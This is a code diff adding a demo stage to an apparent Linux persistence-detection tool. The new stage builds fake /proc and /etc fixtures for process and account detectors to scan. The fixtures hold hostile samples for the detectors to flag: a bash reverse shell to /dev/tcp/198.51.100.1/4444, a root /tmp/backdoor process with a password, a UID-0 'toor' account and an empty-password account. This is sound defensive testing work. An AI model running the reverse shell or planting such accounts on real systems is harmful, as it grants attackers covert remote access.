@@ -8,6 +8,8 @@ from persisthunt.detectors.systemd import SystemdDetector
 from persisthunt.detectors.ssh import SSHDetector
 from persisthunt.detectors.shell import ShellDetector
 from persisthunt.detectors.suid import SuidDetector
+from persisthunt.detectors.process import ProcessDetector
+from persisthunt.detectors.account import AccountDetector
 
 def demo_stage1_findings():
     print("=== Stage 1: Finding Model & Collection Demo ===")
@@ -365,6 +367,116 @@ def demo_stage6_suid_detector():
         print(json.dumps(mock_findings.to_dict(), indent=2))
 
 
+def demo_stage7_process_and_account_detectors():
+    print("\n=== Stage 7: Process & Account Persistence Detector Demo ===")
+
+    # 1. Live audit on host system
+    print("\n--- Scanning Local Host System (Processes) ---")
+    proc_detector = ProcessDetector()
+    proc_findings = proc_detector.scan()
+    print(f"Host Process findings detected: {proc_findings.count()}")
+    print(f"Host Process severity distribution: {proc_findings.severity_counts()}")
+
+    print("\n--- Scanning Local Host System (Accounts) ---")
+    acct_detector = AccountDetector()
+    acct_findings = acct_detector.scan()
+    print(f"Host Account findings detected: {acct_findings.count()}")
+    print(f"Host Account severity distribution: {acct_findings.severity_counts()}")
+
+    # 2. Emulated audit with suspicious Process fixture
+    print("\n--- Scanning Controlled Suspicious Process Fixture ---")
+    with TemporaryDirectory() as tmpdir:
+        root = Path(tmpdir)
+        proc_dir = root / "proc"
+        proc_dir.mkdir(parents=True)
+
+        def add_proc(pid, comm, ppid=1, uid=1000, args=None, exe=None):
+            pdir = proc_dir / str(pid)
+            pdir.mkdir(parents=True, exist_ok=True)
+            (pdir / "status").write_text(f"Name:\t{comm}\nPPid:\t{ppid}\nUid:\t{uid}\t{uid}\t{uid}\t{uid}\n")
+            if args:
+                (pdir / "cmdline").write_bytes(b"\x00".join(a.encode() for a in args) + b"\x00")
+            else:
+                (pdir / "cmdline").write_bytes(b"")
+            if exe:
+                import os
+                os.symlink(exe, pdir / "exe")
+
+        # Process 1: nginx spawning interactive shell -> PH-PROC-005
+        add_proc(500, "nginx", ppid=1, uid=33, args=["nginx: master process"], exe="/usr/sbin/nginx")
+        add_proc(501, "sh", ppid=500, uid=33, args=["/bin/sh"], exe="/bin/sh")
+
+        # Process 2: Deleted binary running in memory -> PH-PROC-003
+        add_proc(600, "stealth_worker", ppid=1, uid=1000, args=["/opt/stealth_worker"], exe="/opt/stealth_worker (deleted)")
+
+        # Process 3: Staged in /tmp with credentials to sanitize -> PH-PROC-001
+        add_proc(700, "backdoor", ppid=1, uid=0, args=["/tmp/backdoor", "--password", "SuperSecretPass123!"], exe="/tmp/backdoor")
+
+        # Process 4: Reverse shell -> PH-PROC-004
+        add_proc(800, "bash", ppid=1, uid=1000, args=["/bin/bash", "-i", ">&", "/dev/tcp/198.51.100.1/4444", "0>&1"], exe="/bin/bash")
+
+        mock_proc_det = ProcessDetector(proc_dir=proc_dir)
+        mock_proc_findings = mock_proc_det.scan()
+
+        print(f"Process fixture findings: {mock_proc_findings.count()}")
+        print(f"Severity breakdown: {mock_proc_findings.severity_counts()}")
+        print("\nProcess findings detail:")
+        for f in mock_proc_findings:
+            print(f"[{f.severity.value}] {f.id} - {f.title}")
+            print(f"  Location: {f.location}")
+            print(f"  Evidence: {f.evidence}")
+            print(f"  Recommendation: {f.recommendation}")
+            print()
+
+    # 3. Emulated audit with suspicious Account fixture
+    print("\n--- Scanning Controlled Suspicious Account Fixture ---")
+    with TemporaryDirectory() as tmpdir:
+        root = Path(tmpdir)
+        etc = root / "etc"
+        etc.mkdir(parents=True)
+
+        # 1. Backdoor UID 0 user -> PH-ACCT-001 (CRITICAL)
+        # 2. Service account with interactive shell -> PH-ACCT-002 (HIGH)
+        # 3. Account with /tmp home -> PH-ACCT-003 (HIGH)
+        # 4. Standard account -> zero findings
+        (etc / "passwd").write_text(
+            "root:x:0:0:root:/root:/bin/bash\n"
+            "toor:x:0:0:Backdoor Root:/root:/bin/bash\n"
+            "www-data:x:33:33:www-data:/var/www:/bin/bash\n"
+            "temp_agent:x:1001:1001::/tmp/agent_home:/bin/bash\n"
+            "alice:x:1000:1000::/home/alice:/bin/bash\n"
+        )
+
+        (etc / "shadow").write_text(
+            "root:$6$saltsalt$dummyhash:18000:0:99999:7:::\n"
+            "toor:$6$saltsalt$dummyhash:18000:0:99999:7:::\n"
+            "www-data:*:18000:0:99999:7:::\n"
+            "temp_agent::19000:0:99999:7:::\n"  # Empty password -> PH-ACCT-004 (CRITICAL)
+            "alice:$6$saltsalt$dummyhash:18000:0:99999:7:::\n"
+        )
+
+        (etc / "group").write_text(
+            "root:x:0:\n"
+            "sudo:x:27:alice\n"
+        )
+
+        mock_acct_det = AccountDetector(root_prefix=root)
+        mock_acct_findings = mock_acct_det.scan()
+
+        print(f"Account fixture findings: {mock_acct_findings.count()}")
+        print(f"Severity breakdown: {mock_acct_findings.severity_counts()}")
+        print("\nAccount findings detail:")
+        for f in mock_acct_findings:
+            print(f"[{f.severity.value}] {f.id} - {f.title}")
+            print(f"  Location: {f.location}")
+            print(f"  Evidence: {f.evidence}")
+            print(f"  Recommendation: {f.recommendation}")
+            print()
+
+        print("--- Account Fixture Findings JSON Output ---")
+        print(json.dumps(mock_acct_findings.to_dict(), indent=2))
+
+
 def main():
     demo_stage1_findings()
     demo_stage2_cron_detector()
@@ -372,6 +484,8 @@ def main():
     demo_stage4_ssh_detector()
     demo_stage5_shell_detector()
     demo_stage6_suid_detector()
+    demo_stage7_process_and_account_detectors()
 
 if __name__ == "__main__":
     main()
+
